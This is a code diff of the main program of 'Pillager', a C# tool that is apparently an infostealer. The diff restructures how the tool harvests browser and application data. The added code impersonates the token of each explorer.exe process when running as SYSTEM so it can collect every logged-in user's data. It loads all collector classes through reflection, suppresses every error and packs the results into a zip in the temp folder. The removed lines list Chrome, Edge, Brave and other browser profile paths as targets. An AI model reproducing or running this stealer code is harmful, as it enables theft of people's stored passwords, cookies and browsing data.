@@ -1,42 +1,91 @@
 ﻿using System;
-using System.Collections.Generic;
+using System.Diagnostics;
 using System.IO;
-using Pillager.Browsers;
+using System.Reflection;
+using Pillager.Helper;
 
 namespace Pillager
 {
     internal class Program
     {
+        static string savepath = Path.Combine(Path.GetTempPath(), "Pillager");
+        static string logpath = Path.Combine(savepath, "Pillager.log");
+        static string savezippath = savepath + ".zip";
+        [STAThread]
         static void Main(string[] args)
         {
-            string savepath = Path.Combine(Path.GetTempPath(), "Pillager");
-            if (!Directory.Exists(savepath)) 
+            if (Directory.Exists(savepath)) Directory.Delete(savepath, true);
+            if (File.Exists(savezippath)) File.Delete(savezippath);
+            Directory.CreateDirectory(savepath);
+
+            if (Environment.UserName.ToLower() == "system")
             {
-                Directory.CreateDirectory(savepath);
+                foreach (Process p in Process.GetProcesses())
+                {
+                    if (p.ProcessName.ToLower() == "explorer" && Methods.ImpersonateProcessToken(p.Id))
+                    {
+                        string usersavepath = Path.Combine(savepath, Methods.GetProcessUserName(p));
+                        Directory.CreateDirectory(usersavepath);
+                        SaveAll(usersavepath);
+                        Native.RevertToSelf();
+                    }
+                }
+            }
+            else
+            {
+                SaveAll(savepath);
             }
 
-            //IE
-            IE.Save(savepath);
+            SaveAllOnce(savepath);
 
-            //Chrome
-            List<List<string>> browserOnChromium = new List<List<string>>()
+            //Zip
+            using (ZipStorer zip = ZipStorer.Create(savezippath))
             {
-                new List<string>() { "Chrome", "Google\\Chrome\\User Data\\Default" } ,
-                new List<string>() { "Chrome Beta", "Google\\Chrome Beta\\User Data\\Default" } ,
-                new List<string>() { "Chromium", "Chromium\\User Data\\Default" } ,
-                new List<string>() { "Edge", "Microsoft\\Edge\\User Data\\Default" } ,
-                new List<string>() { "Brave-Browse", "BraveSoftware\\Brave-Browser\\User Data\\Default" } ,
-                new List<string>() { "QQBrowser", "Tencent\\QQBrowser\\User Data\\Default" } ,
-                new List<string>() { "Vivaldi", "Vivaldi\\User Data\\Default" } ,
-                new List<string>() { "CocCoc", "CocCoc\\Browser\\User Data\\Default" } 
-                //new List<string>() { "", "" } ,
-            };
-            foreach (List<string> browser in browserOnChromium)
+                foreach (var item in Directory.GetDirectories(savepath))
+                    zip.AddDirectory(ZipStorer.Compression.Deflate, item, "");
+                foreach (var item in Directory.GetFiles(savepath))
+                    zip.AddFile(ZipStorer.Compression.Deflate, item, Path.GetFileName(item));
+            }
+            Directory.Delete(savepath, true);
+        }
+
+        static void SaveAll(string savepath)
+        {
+            var self = Assembly.GetExecutingAssembly();
+
+            foreach (var type in self.GetTypes())
             {
-                string chromepath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
-                browser[1]);
-                Chrome chrome = new Chrome(browser[0], chromepath);
-                chrome.Save(savepath);                
+                if (type.IsSubclassOf(typeof(ICommand)))
+                {
+                    File.AppendAllText(logpath, "Try to save " + type.Name + " to " + savepath + ". ");
+                    try
+                    {
+                        var instance = (ICommand)Activator.CreateInstance(type);
+                        instance.Save(savepath);
+                    }
+                    catch { }
+                    File.AppendAllText(logpath, "Finished!" + Environment.NewLine);
+                }
+            }
+        }
+
+        static void SaveAllOnce(string savepath)
+        {
+            var self = Assembly.GetExecutingAssembly();
+
+            foreach (var type in self.GetTypes())
+            {
+                if (type.IsSubclassOf(typeof(ICommandOnce)))
+                {
+                    File.AppendAllText(logpath, "Try to save " + type.Name + " to " + savepath + ". ");
+                    try
+                    {
+                        var instance = (ICommandOnce)Activator.CreateInstance(type);
+                        instance.Save(savepath);
+                    }
+                    catch { }
+                    File.AppendAllText(logpath, "Finished!" + Environment.NewLine);
+                }
             }
         }
     }
